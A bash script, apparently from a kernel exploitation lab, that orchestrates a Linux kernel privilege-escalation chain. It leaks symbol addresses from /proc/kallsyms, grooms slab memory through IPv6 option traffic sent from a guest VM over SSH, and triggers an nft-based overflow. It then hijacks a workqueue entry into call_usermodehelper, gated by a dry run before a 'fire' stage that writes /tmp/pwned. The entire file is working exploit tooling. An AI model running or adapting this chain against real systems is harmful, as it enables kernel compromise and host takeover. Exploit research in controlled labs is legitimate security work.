#!/bin/bash
# v12chain.sh -- nft two-slot chain on TRUE ELIGIBLE boot 35 (rnd-15 everywhere),
# with the daybreak evidence-strengthened observer (r7_obs4) and gates.
# Chain itself unchanged (two-slot; overflower via nft payload SET).
# Fixes folded in: RR option [7,4,5,0] (compile-valid), payload 8+192 exactly.
# Run: sudo bash /tmp/v12chain.sh
set -u
T=/opt/pwnescape/tools
L2="ssh -n -o StrictHostKeyChecking=no -o ConnectTimeout=6 -i /home/ubuntu/.ssh/l2_key ubuntu@192.168.250.114"
LOG=/tmp/c4_obs.log; QLOG=/tmp/c4_queue.log
echo "=== v12 chain (nft + evidence probes) $(date -u +%H:%M:%SZ) ==="
echo "--- 0. config sanity (RANDSTRUCT/LOCKDEP):"
grep -E "CONFIG_RANDSTRUCT|CONFIG_LOCKDEP|CONFIG_PROVE_LOCKING" /boot/config-$(uname -r) 2>/dev/null | head -4
echo "--- 1. observer r7_obs4 (ECHO/ECHORET/WCHK/QUEUE/ACT/EXEC/EXECEND/CB):"
pkill -x bpftrace 2>/dev/null; sleep 0.3; rm -f $LOG
nohup bpftrace -B none $T/r7_obs4.bt > $LOG 2>&1 &
for i in $(seq 1 30); do grep -q Attaching $LOG 2>/dev/null && break; sleep 0.5; done
head -1 $LOG; grep -c "Attaching" $LOG
pgrep -x bpftrace >/dev/null || { echo "ABORT bpftrace"; exit 2; }
TS=$(grep -w rt6_probe_deferred /proc/kallsyms | awk '{print $1}')
systemd-run --unit=r6obsc6 --collect /bin/sh -c "$T/r6obs 0x$TS 900 > $QLOG 2>&1" >/dev/null 2>&1
sleep 1.5; head -1 $QLOG
echo "--- 2. waiter HELD-OPEN via ssh (foreground-in-ssh, TERM-proof) + PING/PONG:"
$L2 "sudo pkill -9 -f '[r]8waiter' 2>/dev/null; sudo pkill -9 -f '[f]aulthandler' 2>/dev/null; sleep 0.5; sudo rm -f /tmp/r8wait.log" >/dev/null 2>&1
nohup $L2 "sudo timeout 900 python3 /tmp/r8waiter.py >/tmp/r8wait.log 2>&1" >/dev/null 2>&1 &
HOLDPID=$!
WOK=0
for wtry in 1 2 3 4 5 6; do
  sleep 1.5
  P=$(python3 - <<'PYEOF'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2.0)
try:
    s.sendto(b"PING", ("192.168.250.114", 9999))
    print(s.recvfrom(64)[0].decode(errors="replace"))
except Exception as e:
    print("NOPE", e)
PYEOF
)
  echo "waiter try $wtry: ${P:-NOPE}"
  [ "$P" = "PONG" ] && { WOK=1; break; }
done
[ "$WOK" = 1 ] || { echo "ABORT: waiter not answering PING/PONG"; kill $HOLDPID 2>/dev/null; $L2 "sudo pkill -9 -f '[r]8waiter' 2>/dev/null" >/dev/null 2>&1; exit 2; }
echo "waiter held (ssh pid $HOLDPID), PONG confirmed"
nft list table ip m2 >/dev/null 2>&1 || { nft add table ip m2; nft 'add chain ip m2 c { type filter hook input priority mangle; }'; }
echo "--- 3. pwq/poolhead:"
taskset -c 7 python3 $T/r7_up6.py 0x8003 >/dev/null 2>&1
sleep 1.2
QL=$(grep QUEUE $QLOG | tail -1); echo "$QL"
PWQ=$(echo "$QL" | awk '{print $3}'); PH=$(echo "$QL" | awk '{print $5}')
echo "PWQ=$PWQ PH=$PH"
[ -n "$PWQ" ] || { echo ABORT-no-pwq; exit 1; }
echo "--- 4. flush 1200 @53600 + main 40 @54800 (retry to 2 pairs):"
$L2 "sudo python3 /tmp/r7_guest.py prime 1200 53600"
MAINB=54800; TRY=0; PICK=""
while :; do
  TRY=$((TRY+1))
  echo "--- main-prime 40 @$MAINB (try $TRY):"
  $L2 "sudo python3 /tmp/r7_guest.py prime 40 $MAINB"
  sleep 2
  PICK=$(python3 - "$MAINB" <<'PYEOF'
import re, sys
mb = int(sys.argv[1])
em = {}; last = None
for ln in open("/tmp/c4_obs.log", errors="replace"):
    m = re.match(r"ECHO dopt=([0-9a-f]+) soptlen=\d+ rr=\d+ sport=(\d+)", ln)
    if not m: continue
    sp = int(m.group(2)); a = int(m.group(1), 16)
    if not (54800 <= sp < 55000): continue
    if not (0xffff888000000000 <= a < 0xffffc90000000000): continue
    if sp not in em: em[sp] = a
    last = (sp, a)
if not last: print("EMPTY"); raise SystemExit
page = last[1] & ~0xfff
a2s = {}
for sp, a in em.items(): a2s.setdefault(a, sp)
pairs = []
for sp, a in sorted(em.items()):
    if (a & ~0xfff) != page: continue
    if a + 64 in a2s: pairs.append((sp, a, a2s[a + 64]))
onpage = sum(1 for a in em.values() if (a & ~0xfff) == page)
print("LASTPAGE %#x ONPAGE %d PAIRS %d EM %d" % (page, onpage, len(pairs), len(em)))
used = set(); sel = []
for sO, O, sX in pairs:
    if sO in used or sX in used: continue
    used.add(sO); used.add(sX); sel.append((sO, O, sX, O + 64))
    if len(sel) == 2: break
for i, (sO, O, sX, X) in enumerate(sel):
    print("SEL%d sO=%d seqO=%#x O=%#x sX=%d seqX=%#x X=%#x" % (i, sO, 0xE0000000 + sO - 54800, O, sX, 0xE0000000 + sX - 54800, X))
PYEOF
)
  echo "$PICK"
  NSEL=$(echo "$PICK" | grep -c "^SEL")
  [ "$NSEL" -ge 2 ] && break
  [ $TRY -ge 4 ] && { echo "ABORT: pairs"; exit 1; }
  MAINB=$((MAINB+50))
done
S0=$(echo "$PICK" | grep "^SEL0" | sed -E "s/.*sO=([0-9]+).*/\1/")
SQ0=$(echo "$PICK" | grep "^SEL0" | sed -E "s/.*seqO=(0x[0-9a-f]+).*/\1/")
O0=$(echo "$PICK" | grep "^SEL0" | sed -E "s/.* O=(0x[0-9a-f]+).*/\1/")
SX0=$(echo "$PICK" | grep "^SEL0" | sed -E "s/.*sX=([0-9]+).*/\1/")
SQX0=$(echo "$PICK" | grep "^SEL0" | sed -E "s/.*seqX=(0x[0-9a-f]+).*/\1/")
X0=$(echo "$PICK" | grep "^SEL0" | sed -E "s/.* X=(0x[0-9a-f]+).*/\1/")
S1=$(echo "$PICK" | grep "^SEL1" | sed -E "s/.*sO=([0-9]+).*/\1/")
SQ1=$(echo "$PICK" | grep "^SEL1" | sed -E "s/.*seqO=(0x[0-9a-f]+).*/\1/")
O1=$(echo "$PICK" | grep "^SEL1" | sed -E "s/.* O=(0x[0-9a-f]+).*/\1/")
SX1=$(echo "$PICK" | grep "^SEL1" | sed -E "s/.*sX=([0-9]+).*/\1/")
SQX1=$(echo "$PICK" | grep "^SEL1" | sed -E "s/.*seqX=(0x[0-9a-f]+).*/\1/")
X1=$(echo "$PICK" | grep "^SEL1" | sed -E "s/.* X=(0x[0-9a-f]+).*/\1/")
echo "DRY-PAIR: sO=$S0 seqO=$SQ0 O=$O0 sX=$SX0 seqX=$SQX0 X=$X0"
echo "FIRE-PAIR: sO=$S1 seqO=$SQ1 O=$O1 sX=$SX1 seqX=$SQX1 X=$X1"
RET=$(grep -w __x86_return_thunk /proc/kallsyms | awk '{print $1}')
UMH=$(grep -w call_usermodehelper_exec_work /proc/kallsyms | awk '{print $1}')
echo "ret_thunk=0x$RET umh_exec_work=0x$UMH"
echo "--- 5. spin_on + executor fix:"
python3 $T/r7_stage.py spin_on
for t in 87 149; do chrt -i -p 0 $t 2>/dev/null; echo "tid $t: $(chrt -p $t 2>/dev/null | head -1 | grep -o 'SCHED_[A-Z]*')"; done
echo "--- 6. chain fixtures (fresh FAILED 0x8009/0x800b; 0x8005 was consumed) + 12s:"
ip -6 neigh replace fe80::8009 lladdr 02:00:00:00:00:09 dev virbr-pwn nud failed && echo gw8009-forced
ip -6 neigh replace fe80::800b lladdr 02:00:00:00:00:0b dev virbr-pwn nud failed && echo gw800b-forced
sleep 12
ND=$(ip -6 neigh show fe80::8009 2>/dev/null); NF=$(ip -6 neigh show fe80::800b 2>/dev/null)
echo "gw8009: [$ND]"; echo "gw800b: [$NF]"
echo "$ND" | grep -q FAILED || { echo "ABORT gw8009"; exit 1; }
echo "$NF" | grep -q FAILED || { echo "ABORT gw800b"; exit 1; }
echo "--- 7. DRY (nft set 0x40; O=$O0 s$S0 / X=$X0 s$SX0; gw 0x8009; ov 46300):"
R7_X=$X0 R7_PWQ=0x$PWQ R7_PH=0x$PH \
taskset -c 7 python3 $T/r7_final4.py \
  $S0 $SQ0 $SX0 $SQX0 0x8009 46300 0x9d000001 dry
sleep 1.2
QW=$(grep QUEUE $QLOG | tail -1 | awk '{print $2}')
ACX=$(grep -a "^ACT" $LOG | grep "work=${X0#0x}" | tail -1)
ER=$(grep -a "^ECHORET" $LOG | grep "sport=46300" | tail -1)
WK=$(grep -a "^WCHK" $LOG | tail -1)
EX=$(grep -a "^EXEC " $LOG | grep "work=${X0#0x}" | tail -1)
XE=$(grep -a "^EXECEND" $LOG | grep "work=${X0#0x}" | tail -1)
echo "gate QUEUE work=$QW (want ${X0#0x})"
echo "gate ACT: ${ACX:-MISSING}"
echo "gate ECHORET: ${ER:-MISSING}"
echo "gate WCHK: $WK"
echo "gate EXEC: ${EX:-MISSING}"
echo "gate EXECEND: ${XE:-MISSING}"
ERO=$(echo "$ER" | sed -E "s/.*ret=(-?[0-9]+).*/\1/")
ERL=$(echo "$ER" | sed -E "s/.*dstoptlen=([0-9]+).*/\1/")
if [ "$QW" = "${X0#0x}" ] && [ -n "$ACX" ] && [ "$ERO" = "0" ] && [ "$ERL" = "64" ] \
   && echo "$WK" | grep -q "kmalloc-rnd-15-64" \
   && echo "$EX" | grep -q "funclive=$RET" && echo "$XE" | grep -q "funccalled=$RET"; then
  echo "=== DRY GATES PASS (all six) -> FIRE (nft set 0xE0; O=$O1 s$S1 / X=$X1 s$SX1; gw 0x800b; ov 46301):"
  rm -f /tmp/pwned /tmp/r7dry
  R7_X=$X1 R7_PWQ=0x$PWQ R7_PH=0x$PH \
  taskset -c 7 python3 $T/r7_final4.py \
    $S1 $SQ1 $SX1 $SQX1 0x800b 46301 0x9d000002 fire
  sleep 1.2
  QW2=$(grep QUEUE $QLOG | tail -1 | awk '{print $2}')
  ACX2=$(grep -a "^ACT" $LOG | grep "work=${X1#0x}" | tail -1)
  ER2=$(grep -a "^ECHORET" $LOG | grep "sport=46301" | tail -1)
  WK2=$(grep -a "^WCHK" $LOG | tail -1)
  EX2=$(grep -a "^EXEC " $LOG | grep "work=${X1#0x}" | tail -1)
  XE2=$(grep -a "^EXECEND" $LOG | grep "work=${X1#0x}" | tail -1)
  CB=$(grep -a "^CB " $LOG | tail -1)
  echo "gate QUEUE work=$QW2 (want ${X1#0x})"
  echo "gate ACT: ${ACX2:-MISSING}"
  echo "gate ECHORET: ${ER2:-MISSING}"
  echo "gate WCHK: $WK2"
  echo "gate EXEC: ${EX2:-MISSING}"
  echo "gate EXECEND: ${XE2:-MISSING}"
  echo "gate CB: ${CB:-MISSING}"
  echo "=== release (spin_off) -> remaining EXECs:"
  python3 $T/r7_stage.py spin_off
  sleep 5
  echo "--- EXEC/EXECEND/CB tail:"; grep -aE "^EXEC|^EXECEND|^CB " $LOG | tail -8
  echo "=== /tmp/pwned:"; cat /tmp/pwned 2>&1; ls -la /tmp/pwned 2>&1
  echo "=== host:"; uptime
  echo "=== raw gate lines for the record:"
  grep -aE "QUEUE|ACT|ECHORET|WCHK|EXEC|EXECEND|CB " $LOG | tail -20
  kill $HOLDPID 2>/dev/null
  $L2 "sudo pkill -9 -f '[r]8waiter' 2>/dev/null" >/dev/null 2>&1
else
  echo "=== DRY GATES FAIL -> NO FIRE"
  echo "fail detail: QUEUE=$QW ACT=${ACX:-none} ECHORET=${ER:-none} (ret=$ERO len=$ERL) WCHK=$WK EXEC=${EX:-none} EXECEND=${XE:-none}"
  python3 $T/r7_stage.py spin_off
  kill $HOLDPID 2>/dev/null
  $L2 "sudo pkill -9 -f '[r]8waiter' 2>/dev/null" >/dev/null 2>&1
fi
